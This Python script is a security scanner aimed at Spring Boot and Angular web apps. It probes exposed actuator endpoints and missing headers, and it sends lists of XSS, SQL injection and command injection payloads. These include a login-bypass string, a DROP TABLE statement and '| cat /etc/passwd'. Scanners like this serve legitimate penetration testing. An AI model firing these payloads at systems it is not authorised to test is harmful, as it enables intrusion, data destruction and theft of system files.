#!/usr/bin/env python3
"""
Comprehensive Security Testing Script for Spring Boot + Angular Applications
Author: Security Tester
Usage: python security_test.py <target_url>
"""

import requests
import sys
import json
import time
from urllib.parse import urljoin
import subprocess
import argparse
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class SecurityTester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Security-Scanner/1.0',
            'Content-Type': 'application/json'
        })
        if auth_token:
            self.session.headers.update({'Authorization': f'Bearer {auth_token}'})
        
        # Common payloads for testing
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert(1)</script>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>'
        ]
        
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users;--",
            "' OR SLEEP(5)--",
            "' AND 1=CONVERT(int, (SELECT @@version))--"
        ]
        
        self.command_injection_payloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '`id`',
            '$(whoami)',
            '; ping -c 5 127.0.0.1'
        ]

    def test_endpoints(self):
        """Test common Spring Boot endpoints for exposure"""
        endpoints = [
            '/actuator',
            '/actuator/health',
            '/actuator/env',
            '/actuator/metrics',
            '/actuator/beans',
            '/actuator/mappings',
            '/actuator/configprops',
            '/h2-console',
            '/swagger-ui.html',
            '/v2/api-docs',
            '/graphql',
            '/api-docs'
        ]
        
        logger.info("Testing Spring Boot endpoints...")
        exposed_endpoints = []
        
        for endpoint in endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code < 400:
                    exposed_endpoints.append((endpoint, response.status_code))
                    logger.warning(f"Exposed endpoint: {endpoint} - Status: {response.status_code}")
            except requests.RequestException:
                continue
        
        return exposed_endpoints

    def test_xss(self, form_endpoints):
        """Test for Cross-Site Scripting vulnerabilities"""
        logger.info("Testing for XSS vulnerabilities...")
        vulnerable_points = []
        
        # Test in query parameters
        test_params = {
            'search': self.xss_payloads[0],
            'q': self.xss_payloads[1],
            'name': self.xss_payloads[2]
        }
        
        # Test search endpoints
        search_urls = [
            f"{self.base_url}/api/search?q=",
            f"{self.base_url}/api/users?name=",
            f"{self.base_url}/api/products?search="
        ]
        
        for url in search_urls:
            for payload in self.xss_payloads[:3]:
                try:
                    response = self.session.get(url + requests.utils.quote(payload), timeout=5)
                    if payload in response.text:
                        vulnerable_points.append(f"Reflected XSS in {url}")
                        logger.warning(f"Possible XSS vulnerability in {url}")
                        break
                except:
                    continue
        
        return vulnerable_points

    def test_sql_injection(self):
        """Test for SQL Injection vulnerabilities"""
        logger.info("Testing for SQL Injection...")
        vulnerable_points = []
        
        # Test login endpoint
        login_data = {
            'username': 'admin\' OR \'1\'=\'1',
            'password': 'anything'
        }
        
        try:
            response = self.session.post(
                urljoin(self.base_url, '/api/login'),
                json=login_data,
                timeout=5
            )
            if response.status_code == 200 and 'token' in response.text:
                vulnerable_points.append("Login SQL Injection")
                logger.warning("Possible SQL Injection in login endpoint")
        except:
            pass
        
        # Test search endpoints with SQL payloads
        search_endpoints = ['/api/search', '/api/users', '/api/products']
        
        for endpoint in search_endpoints:
            for payload in self.sql_payloads[:3]:
                try:
                    response = self.session.get(
                        urljoin(self.base_url, endpoint),
                        params={'q': payload},
                        timeout=5
                    )
                    # Check for database errors in response
                    error_indicators = ['SQL', 'syntax', 'database', 'mysql', 'postgresql', 'oracle']
                    if any(indicator in response.text.lower() for indicator in error_indicators):
                        vulnerable_points.append(f"SQLi in {endpoint}")
                        logger.warning(f"Possible SQL Injection in {endpoint}")
                        break
                except:
                    continue
        
        return vulnerable_points

    def test_command_injection(self):
        """Test for Command Injection vulnerabilities"""
        logger.info("Testing for Command Injection...")
        
        # Test file upload/download endpoints
        endpoints = [
            '/api/export',
            '/api/download',
            '/api/upload',
            '/api/execute'
        ]
        
        for endpoint in endpoints:
            for payload in self.command_injection_payloads:
                try:
                    response = self.session.post(
                        urljoin(self.base_url, endpoint),
                        json={'filename': payload},
                        timeout=10
                    )
                    if response.status_code == 500:
                        logger.warning(f"Possible command injection in {endpoint}")
                except requests.exceptions.Timeout:
                    logger.warning(f"Timeout on {endpoint} with payload {payload} - possible command injection")
                except:
                    continue

    def check_security_headers(self):
        """Check for security headers in responses"""
        logger.info("Checking security headers...")
        
        required_headers = {
            'Content-Security-Policy': 'Prevents XSS and injection attacks',
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY or SAMEORIGIN',
            'Strict-Transport-Security': 'Enforces HTTPS',
            'X-XSS-Protection': '1; mode=block'
        }
        
        missing_headers = []
        
        try:
            response = self.session.get(self.base_url, timeout=5)
            for header, description in required_headers.items():
                if header not in response.headers:
                    missing_headers.append(header)
                    logger.warning(f"Missing security header: {header}")
        except:
            pass
        
        return missing_headers

    def run_all_tests(self):
        """Execute all security tests"""
        results = {
            'exposed_endpoints': self.test_endpoints(),
            'xss_vulnerabilities': self.test_xss([]),
            'sql_injections': self.test_sql_injection(),
            'missing_headers': self.check_security_headers()
        }
        
        return results

def main():
    parser = argparse.ArgumentParser(description='Security Testing Script for Spring Boot + Angular Apps')
    parser.add_argument('url', help='Base URL of the application')
    parser.add_argument('--token', help='JWT/Bearer token for authenticated endpoints')
    parser.add_argument('--output', help='Output file for results (JSON)', default='security_scan_results.json')
    
    args = parser.parse_args()
    
    tester = SecurityTester(args.url, args.token)
    
    logger.info(f"Starting security scan for {args.url}")
    
    try:
        results = tester.run_all_tests()
        
        # Save results
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        
        logger.info(f"Scan completed. Results saved to {args.output}")
        
        # Print summary
        print("\n" + "="*50)
        print("SECURITY SCAN SUMMARY")
        print("="*50)
        print(f"Target: {args.url}")
        print(f"Exposed endpoints: {len(results['exposed_endpoints'])}")
        print(f"XSS vulnerabilities: {len(results['xss_vulnerabilities'])}")
        print(f"SQL Injection points: {len(results['sql_injections'])}")
        print(f"Missing security headers: {len(results['missing_headers'])}")
        print("="*50)
        
    except KeyboardInterrupt:
        logger.info("Scan interrupted by user")
    except Exception as e:
        logger.error(f"Error during scan: {str(e)}")

if __name__ == "__main__":
    main()